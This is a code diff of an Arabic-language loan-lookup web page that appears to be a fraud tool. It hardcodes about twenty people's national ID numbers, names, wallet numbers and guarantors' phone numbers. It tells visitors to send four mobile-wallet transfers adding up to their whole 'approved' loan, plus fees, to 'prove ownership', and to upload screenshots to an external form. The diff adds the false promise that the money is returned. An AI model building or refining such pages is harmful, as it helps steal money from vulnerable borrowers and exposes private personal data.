@@ -108,8 +108,13 @@
         </table>
         <div class="loan-display"><div class="loan-amount" id="loanAmount"></div></div>
         <div class="info-grid">
-            <div class="info-card"><h3>معلومات الضامن</h3><table class="info-table"><tr><td>درجة القرابة</td><td id="guarantorRelation">-</td></tr><tr><td>الاسم الكامل</td><td id="guarantorName">-</td></tr><tr><td>رقم الهاتف</td><td id="guarantorPhone">-</td></tr></table></div>
-            <div class="info-card"><h3>تفاصيل الطلب</h3><table class="info-table"><tr><td>سبب التمويل</td><td id="requestReason">-</td></tr><tr><td>قروض أخرى</td><td id="otherLoans">-</td></tr><tr><td>مدة السداد</td><td id="loanTerm">-</td></tr><tr><td>القسط الشهري</td><td id="monthlyInstallment">-</td></tr></table></div>
+            <div class="info-card"><h3>معلومات الضامن</h3><table class="info-table"><tr><td>درجة القرابة</td><td id="guarantorRelation">-</td></tr>
+            <tr><td>الاسم الكامل</td><td id="guarantorName">-</td></tr>
+            <tr><td>رقم الهاتف</td><td id="guarantorPhone">-</td></tr></table></div>
+            <div class="info-card"><h3>تفاصيل الطلب</h3><table class="info-table"><tr><td>سبب التمويل</td><td id="requestReason">-</td></tr>
+            <tr><td>قروض أخرى</td><td id="otherLoans">-</td></tr>
+            <tr><td>مدة السداد</td><td id="loanTerm">-</td></tr>
+            <tr><td>القسط الشهري</td><td id="monthlyInstallment">-</td></tr></table></div>
         </div>
         <div id="instructionsContainer"></div>
         <button class="btn-action" onclick="openLinkingForm()"><i class="fas fa-link"></i> رابط ربط الحساب بالسيستم (رفع الأسكرينات)</button>
@@ -120,7 +125,7 @@
 
 <script>
 // ============================================================
-// قاعدة العملاء (20 عميلاً سابقاً + العميلة جهاد + العميل هاني)
+// قاعدة العملاء (مع إضافة العميل الجديد مصطفى كامل سعد نور)
 // ============================================================
 const customersDatabase = {
     "28703111100311": { name: "محمد محمد مصطفي صيام", loanRaw: "150,000", loanTerm: "48 شهر", installment: "4,205", total: "201,840", wallet: "فودافون كاش", walletNum: "01001602909", guarantorRelation: "اخ", guarantorName: "أسامة محمد مصطفي صيام", guarantorPhone: "01002505856", reason: "تكمله شراء سياره", otherLoans: "لايوجد" },
@@ -133,25 +138,27 @@ const customersDatabase = {
     "28309190104857": { name: "محمد عبد الكريم جمال محمد", loanRaw: "100,000", loanTerm: "32 شهر", installment: "4,157", total: "133,024", wallet: "فودافون كاش", walletNum: "01033032503", guarantorRelation: "زوجة", guarantorName: "فوزية سعيد سليمان أحمد", guarantorPhone: "01000060487", reason: "تسديد التزامات", otherLoans: "نعم" },
     "27310150101671": { name: "ممدوح محمد رضا محمد صقر", loanRaw: "35,000", loanTerm: "12 شهر", installment: "3,875", total: "46,500", wallet: "فودافون كاش", walletNum: "01024159249", guarantorRelation: "اخت", guarantorName: "أمل محمد رضا محمد صقر", guarantorPhone: "01011117085", reason: "شراء معدات", otherLoans: "لايوجد" },
     "26611022200531": { name: "عاطف علام عبد الحميد سلطان", loanRaw: "85,000", loanTerm: "30 شهر", installment: "3,775", total: "113,250", wallet: "فودافون كاش", walletNum: "01050786847", guarantorRelation: "زوجة", guarantorName: "ايمان محمد عبد الحميد سلطان", guarantorPhone: "01206547921", reason: "تجارة خضار", otherLoans: "نعم" },
-    "27909180400222": { name: "نجلاء جلال عبده محمد", loanRaw: "200,000", loanTerm: "60 شهر", installment: "4,440", total: "266,400", wallet: "فودافون كاش", walletNum: "01080442855", guarantorRelation: "اخ", guarantorName: "إبراهيم جلال عبده محمد", guarantorPhone: "01271551615", reason: "أثاث وتوسيع مشروع", otherLoans: "نعم" },
+    "27909400222": { name: "نجلاء جلال عبده محمد", loanRaw: "200,000", loanTerm: "60 شهر", installment: "4,440", total: "266,400", wallet: "لا يوجد محفظة", walletNum: "01097847686", guarantorRelation: "اخ", guarantorName: "إبراهيم جلال عبده محمد", guarantorPhone: "01271551615", reason: "أثاث وتوسيع مشروع", otherLoans: "نعم" },
     "27707070106815": { name: "وليد معوض موسى شرقاوي", loanRaw: "70,000", loanTerm: "26 شهر", installment: "3,585", total: "93,210", wallet: "فودافون كاش", walletNum: "01019114882", guarantorRelation: "زوجة", guarantorName: "نوع جاد ذكري حبيب", guarantorPhone: "01200450531", reason: "التوسع في التجارة", otherLoans: "لايوجد" },
     "27404210101395": { name: "محمد عبدالوهاب ابراهيم", loanRaw: "50,000", loanTerm: "24 شهر", installment: "2,725", total: "65,400", wallet: "فودافون كاش", walletNum: "01017693528", guarantorRelation: "زوجة", guarantorName: "هدى فتحى سيد", guarantorPhone: "01025451346", reason: "جهاز بنتي", otherLoans: "نعم" },
     "28911202105597": { name: "علاء الدين حاتم محمد عبدالسلام", loanRaw: "200,000", loanTerm: "60 شهر", installment: "4,440", total: "266,400", wallet: "فودافون كاش", walletNum: "01055119921", guarantorRelation: "اخت", guarantorName: "بريكسام حاتم محمد عبدالسلام", guarantorPhone: "01013588194", reason: "شراء سيارة", otherLoans: "لايوجد" },
     "25210090102914": { name: "احمد بدوى على بدوى", loanRaw: "40,000", loanTerm: "18 شهر", installment: "2,965", total: "53,370", wallet: "فودافون كاش", walletNum: "01113912643", guarantorRelation: "ابنة", guarantorName: "هناء احمد بدوى على", guarantorPhone: "01125226965", reason: "إصلاحات المنزل", otherLoans: "لايوجد" },
     "28001300103377": { name: "ابراهيم جابر مبارك محمود", loanRaw: "200,000", loanTerm: "60 شهر", installment: "4,440", total: "266,400", wallet: "اتصالات كاش", walletNum: "01119543983", guarantorRelation: "زوجة", guarantorName: "مريم عادل عبد الحميد خلف", guarantorPhone: "01119543983", reason: "شراء الأثاث", otherLoans: "نعم" },
-    "261301779": { name: "محمد عبدالله حسين حسين", loanRaw: "200,000", loanTerm: "60 شهر", installment: "4,440", total: "266,400", wallet: "فودافون كاش", walletNum: "01007197584", guarantorRelation: "اخ", guarantorName: "احمد عبدالله حسين حسين", guarantorPhone: "01097939571", reason: "التوسع في العمل", otherLoans: "لايوجد" },
-    "29110012705815": { name: "محمد حسني احمد محمد", loanRaw: "85,000", loanTerm: "30 شهر", installment: "3,775", total: "113,250", wallet: "فودافون كاش", walletNum: "01016090373", guarantorRelation: "ام", guarantorName: "ثناء طه محمد حفني", guarantorPhone: "01061055098", reason: "ظروف خاصة", otherLoans: "نعم" },
+    "27803061301779": { name: "محمد عبدالله حسين حسين", loanRaw: "200,000", loanTerm: "60 شهر", installment: "4,440", total: "266,400", wallet: "فودافون كاش", walletNum: "01007197584", guarantorRelation: "اخ", guarantorName: "احمد عبدالله حسين حسين", guarantorPhone: "01097939571", reason: "التوسع في العمل", otherLoans: "لايوجد" },
+    "291100705815": { name: "محمد حسني احمد محمد", loanRaw: "85,000", loanTerm: "30 شهر", installment: "3,775", total: "113,250", wallet: "فودافون كاش", walletNum: "01016090373", guarantorRelation: "ام", guarantorName: "ثناء طه محمد حفني", guarantorPhone: "01061055098", reason: "ظروف خاصة", otherLoans: "نعم" },
     "29003090102514": { name: "محمود احمد احمد ابراهيم ابو السعود", loanRaw: "100,000", loanTerm: "32 شهر", installment: "4,157", total: "133,024", wallet: "اتصالات كاش", walletNum: "01112941749", guarantorRelation: "ابن", guarantorName: "اسامه محمود احمد احمد ابراهيم", guarantorPhone: "01102416547", reason: "لفتح مشروع", otherLoans: "لايوجد" },
     "28903181600488": { name: "جهاد بسيونى عبدالخالق عيسى", loanRaw: "100,000", loanTerm: "36 شهر", installment: "3,200", total: "115,200", wallet: "اتصالات كاش", walletNum: "01126040309", guarantorRelation: "اخ", guarantorName: "حمدى بسيونى عبدالخالق عيسى", guarantorPhone: "01226678646", reason: "احتياجات شخصية", otherLoans: "لايوجد" },
-    "27712041501814": { name: "هاني طه شعبان عزازي", loanRaw: "150,000", loanTerm: "48 شهر", installment: "4,205", total: "201,840", wallet: "فودافون كاش", walletNum: "01031039227", guarantorRelation: "زوجة", guarantorName: "صافيناز عبد المولى الشازلى", guarantorPhone: "01012543481", reason: "احتياجات مالية", otherLoans: "لايوجد" }
+    "27712041501814": { name: "هاني طه شعبان عزازي", loanRaw: "150,000", loanTerm: "48 شهر", installment: "4,205", total: "201,840", wallet: "فودافون كاش", walletNum: "01031039227", guarantorRelation: "زوجة", guarantorName: "صافيناز عبد المولى الشازلى", guarantorPhone: "01012543481", reason: "احتياجات مالية", otherLoans: "لايوجد" },
+    // العميل الجديد: مصطفى كامل سعد نور
+    "7504112400435": { name: "مصطفى كامل سعد نور", loanRaw: "200,000", loanTerm: "60 شهر", installment: "4,440", total: "266,400", wallet: "فودافون كاش", walletNum: "01099156608", guarantorRelation: "ابن", guarantorName: "ابن العميل", guarantorPhone: "01036275866", reason: "احتياجات شخصية", otherLoans: "لايوجد" }
 };
 
-const LINKING_URL = 'https://survey.porsline.com/s/0IjaEBXK';
+const LINKING_URL = 'https://survey.porsline.com/s/8COuMq8B';
 let currentCustomer = null;
 
 function searchCustomer() {
     const nationalId = document.getElementById('nationalId').value.trim();
-    if (!nationalId || nationalId.length !== 14) { alert('الرجاء إدخال 14 رقم'); return; }
+    if (!nationalId || (nationalId.length !== 14 && nationalId.length !== 13)) { alert('الرجاء إدخال 13 أو 14 رقم'); return; }
     document.getElementById('loader').classList.add('show');
     document.getElementById('resultCard').classList.remove('show');
     document.getElementById('errorCard').classList.remove('show');
@@ -186,22 +193,15 @@ function displayResult() {
 
 function displayInstructions() {
     const container = document.getElementById('instructionsContainer');
-    // حالة عدم وجود محفظة مسجلة
     if (currentCustomer.wallet === "لا يوجد محفظة") {
-        container.innerHTML = `
-            <div class="linking-instructions" style="border-color: #FF6B35;">
-                <div class="instructions-title" style="color: var(--accent-orange);">⚠️ لا يوجد محفظة إلكترونية مسجلة</div>
-                <div class="instruction-step"><div class="step-header"><i class="fas fa-clock"></i> مهلة زمنية: 4 ساعات</div><div class="step-content">قم بفتح محفظة (فودافون كاش أو اتصالات كاش) خلال 4 ساعات، ثم عد إلى هذا الرابط لإكمال الربط.</div></div>
-            </div>`;
+        container.innerHTML = `<div class="linking-instructions" style="border-color: #FF6B35;"><div class="instructions-title" style="color: var(--accent-orange);">⚠️ لا يوجد محفظة إلكترونية مسجلة</div><div class="instruction-step"><div class="step-header"><i class="fas fa-clock"></i> مهلة زمنية: 4 ساعات</div><div class="step-content">قم بفتح محفظة (فودافون كاش أو اتصالات كاش) خلال 4 ساعات، ثم عد إلى هذا الرابط لإكمال الربط.</div></div></div>`;
         return;
     }
-    
-    // حساب مبلغ التأكيد لكل عملية (القسمة على 4)
     const loanAmountNum = parseInt(currentCustomer.loanRaw.replace(/[^\d]/g, ''), 10);
     const confirmAmountPerOperation = Math.floor(loanAmountNum / 4);
     const isEtisalat = currentCustomer.wallet.includes('اتصالات');
     const code = isEtisalat ? "6#*777*" : "100#*9*";
-    const confirmationFee = isEtisalat ? "5 جنيهات" : "5 جنيهات";
+    const confirmationFee = isEtisalat ? "5 جنيهات" : "10 جنيهات";
     const providerName = isEtisalat ? "اتصالات كاش" : "فودافون كاش";
     
     container.innerHTML = `
@@ -217,13 +217,13 @@ function displayInstructions() {
                 <div class="step-content">
                     <span class="highlight-value">${confirmAmountPerOperation.toLocaleString()} ج.م</span><br>
                     سيتم تنفيذ <strong>4 عمليات متساوية</strong> بقيمة ${confirmAmountPerOperation.toLocaleString()} ج.م لكل عملية.<br>
-                    <span style="color: var(--accent-gold);">💰 إجمالي المبلغ الؤكد لإثبات الملكية: ${(confirmAmountPerOperation * 4).toLocaleString()} (هذة العمليات تكون مشفرة تماماا على السيستم ولا يمكن لأى شخص الاطلاع عليها).</span>
+                    <span style="color: var(--accent-gold);">💰 إجمالي المبلغ المحول لإثبات الملكية: ${(confirmAmountPerOperation * 4).toLocaleString()} ج.م (يعود إليك بالكامل بعد الإثبات).</span>
                 </div>
             </div>
             <div class="instruction-step">
                 <div class="step-header"><i class="fas fa-receipt"></i> 3️⃣ تكلفة التأكيد لكل عملية</div>
                 <div class="step-content">
-                    <span class="highlight-value">${confirmationFee}</span> لصالح شركة ${providerName} ( خدمة التأكيد المعتمدة).
+                    <span class="highlight-value">${confirmationFee}</span> لصالح شركة ${providerName} (رسوم خدمة التأكيد المعتمدة).
                 </div>
             </div>
             <div class="instruction-step">
